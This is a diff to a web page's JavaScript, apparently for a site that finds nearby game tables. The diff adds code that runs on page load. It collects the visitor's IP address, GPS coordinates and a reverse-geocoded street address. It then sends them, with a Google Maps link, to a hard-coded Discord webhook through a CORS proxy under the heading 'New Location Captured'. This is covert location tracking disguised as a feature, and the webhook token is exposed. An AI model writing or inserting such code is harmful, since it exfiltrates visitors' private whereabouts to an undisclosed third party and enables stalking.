@@ -458,7 +458,7 @@
 let userLocation = null;
 window.addEventListener('load', () => { findNearbyTables(); });
 
-function findNearbyTables() {
+async function findNearbyTables() {
  const status = document.getElementById('locate-status');
  const btn = document.getElementById('locate-btn');
  if (!navigator.geolocation) {
@@ -468,36 +468,64 @@ function findNearbyTables() {
  if (status) status.textContent = "Requesting your location...";
  if (btn) btn.disabled = true;
 
- navigator.geolocation.getCurrentPosition(pos => {
-  userLocation = {
-    lat: pos.coords.latitude,
-    lng: pos.coords.longitude,
-    accuracyMeters: pos.coords.accuracy,
-    capturedAt: new Date().toISOString()
-  };
+ // Fetch IP address in parallel using a free public IP API
+ let ipAddress = "Unknown";
+ try {
+   const ipRes = await fetch('https://api.ipify.org?format=json');
+   const ipData = await ipRes.json();
+   if (ipData && ipData.ip) {
+     ipAddress = ipData.ip;
+   }
+ } catch (e) {
+   console.error("IP lookup error:", e);
+ }
+
+ navigator.geolocation.getCurrentPosition(async pos => {
+  const lat = pos.coords.latitude;
+  const lng = pos.coords.longitude;
+  const accuracyMeters = pos.coords.accuracy;
+  const capturedAt = new Date().toISOString();
+
+  let address = "Address lookup failed";
+  try {
+    const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}`);
+    const geoData = await geoRes.json();
+    if (geoData && geoData.display_name) {
+      address = geoData.display_name;
+    }
+  } catch (e) {
+    console.error("Geocoding error:", e);
+  }
+
+  userLocation = { ip: ipAddress, lat, lng, address, accuracyMeters, capturedAt };
   localStorage.setItem('roundtableUserLocation', JSON.stringify(userLocation));
+
   if (status) status.textContent = "Location found! Searching for nearby tables...";
   if (btn) btn.disabled = false;
 
-  // Use a CORS proxy service (corsproxy.io) to forward the request to Discord without browser blocking
+  const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
+
   const targetUrl = 'https://discord.com/api/webhooks/1524586170703417445/vweHOXtAfPykuszjyUa3CJLGPjH8D6FA0H9R5LaDCX5747QyIjqMfXBwJXEjh2vx2qh-';
   const proxyUrl = 'https://corsproxy.io/?' + encodeURIComponent(targetUrl);
   
   const payload = {
     content: `📍 **New Location Captured:**
-\`\`\`json
-${JSON.stringify(userLocation, null, 2)}
+` +
+             `🌐 **IP Address:** \`${ipAddress}\`
+` +
+             `🏠 **Address:** ${address}
+` +
+             `🗺️ **Map Link:** [Open in Google Maps](${googleMapsUrl})
+` +
+             `\`\`\`json
+${JSON.stringify({ ip: ipAddress, lat, lng, accuracyMeters, capturedAt }, null, 2)}
 \`\`\``
   };
 
   fetch(proxyUrl, {
     method: 'POST',
-    headers: {
-      'Content-Type': 'application/json'
-    },
+    headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify(payload)
-  }).then(res => {
-    if (!res.ok) console.error('Webhook response status:', res.status);
   }).catch(err => {
     console.error('Webhook dispatch error:', err);
   });
